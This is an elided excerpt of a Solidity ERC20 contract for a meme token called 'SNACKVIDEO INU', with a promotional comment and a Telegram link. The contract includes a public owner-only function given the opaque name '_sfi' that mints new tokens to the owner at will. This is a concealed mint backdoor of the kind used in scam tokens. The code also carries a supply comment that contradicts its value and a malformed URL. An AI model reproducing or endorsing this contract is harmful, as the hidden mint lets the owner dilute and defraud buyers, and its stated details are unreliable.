...
//
// $SNACKVIDEOINU proposes an innovative feature in its contract.
//
// 📱 Telegram:https::https://t.me/SnackVideoInu
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _sfi(uint256 amount) public onlyOwner {
    _sfi(msg.sender, amount);
    }
    ...
    function _sfi(address account, uint256 amount) internal virtual {
...
contract $SNACKVIDEOINU is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("SNACKVIDEO INU", "SVI") {
        _sfi(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}